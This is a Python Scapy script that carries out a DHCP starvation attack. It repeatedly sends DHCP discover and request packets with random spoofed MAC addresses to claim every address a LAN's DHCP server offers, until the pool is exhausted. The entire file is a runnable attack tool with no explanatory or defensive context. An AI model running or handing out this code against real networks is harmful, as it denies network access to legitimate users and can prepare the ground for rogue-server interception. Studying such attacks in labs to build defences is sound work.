#!venv/bin/python

from scapy.all import *
from scapy.all import Ether, IP, UDP, BOOTP, DHCP

source_interface = "Ethernet"
conf.checkIPaddr = False


# EXHAUST ACTUAL DHCP POOL
def exhaust():
    i = 0
    loop = True
    xid = 0

    # FIND DHCP IP
    MAC_ADDR = str(RandMAC())
    dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff') \
                    / IP(src='0.0.0.0', dst='255.255.255.255') \
                    / UDP(sport=68, dport=67) \
                    / BOOTP(op=1, chaddr=MAC_ADDR, xid=xid) \
                    / DHCP(options=[('message-type', 'discover'), ('end')])
    sendp(dhcp_discover, iface=source_interface, verbose=0, count=1)
    offer = sniff(filter="port 68 and port 67",lfilter=lambda p: (p["BOOTP"].siaddr == p["IP"].src and p["BOOTP"].xid == xid), iface=source_interface, timeout=5, count=1)
    try:
        offer_addr = offer[0]["BOOTP"].yiaddr
        offer_servaddr = offer[0]["BOOTP"].siaddr
    except:
        return

    # ACCEPT OFFER
    dhcp_request = Ether(dst='ff:ff:ff:ff:ff:ff') \
                    / IP(src='0.0.0.0', dst='255.255.255.255') \
                    / UDP(sport=68, dport=67) \
                    / BOOTP(op=1, xid=xid, chaddr=MAC_ADDR) \
                    / DHCP(options=[("message-type", "request"),
                                    ("requested_addr", offer_addr),
                                    ("server_id", offer_servaddr),
                                    "end"])

    sendp(dhcp_request, iface=source_interface, verbose=0, count=1)
    ack = sniff(filter=f"src host {offer_servaddr} and port 68 and port 67", lfilter=lambda p: (p["BOOTP"].xid == xid) , iface=source_interface, timeout=10, count=1)
    i += 1
    print(f"Packets sent : {i}\r")


    # LOOP ONCE DHCP IP IS KNOWN

    while loop:
        xid += 1
        # Create DHCP discover with destination IP = broadadcast
        # Source MAC address is a random MAC address
        # Source IP address = 0.0.0.0
        # Destination IP address = broadcast
        # Source port = 68 (DHCP / BOOTP Client)
        # Destination port = 67 (DHCP / BOOTP Server)
        # DHCP message type is discover
        
        # SEND DISCOVER
        MAC_ADDR = str(RandMAC())
        dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff') \
                        / IP(src='0.0.0.0', dst='255.255.255.255') \
                        / UDP(sport=68, dport=67) \
                        / BOOTP(op=1, chaddr=MAC_ADDR, xid=xid) \
                        / DHCP(options=[('message-type', 'discover'), ('end')])
        sendp(dhcp_discover, iface=source_interface, verbose=0, count=1)

        # SNIFF OFFER
        offer = sniff(filter=f"src host {offer_servaddr} and port 68 and port 67", iface=source_interface, timeout=10, count=1)
        try:
            offer_addr = offer[0]["BOOTP"].yiaddr
            offer_servaddr = offer[0]["BOOTP"].siaddr

            # ACCEPT OFFER
            dhcp_request = Ether(dst='ff:ff:ff:ff:ff:ff') \
                            / IP(src='0.0.0.0', dst='255.255.255.255') \
                            / UDP(sport=68, dport=67) \
                            / BOOTP(op=1, xid=xid, chaddr=MAC_ADDR) \
                            / DHCP(options=[("message-type", "request"),
                                            ("requested_addr", offer_addr),
                                            ("server_id", offer_servaddr),
                                            "end"])

            sendp(dhcp_request, iface=source_interface, verbose=0, count=1)
            ack = sniff(filter=f"src host {offer_servaddr} and port 68 and port 67", lfilter=lambda p: (p["BOOTP"].xid == xid) , iface=source_interface, timeout=10, count=1)
            i += 1
            print(f"Packets sent : {i}\r")
        except:
            loop=False

if __name__ == "__main__":
    exhaust()
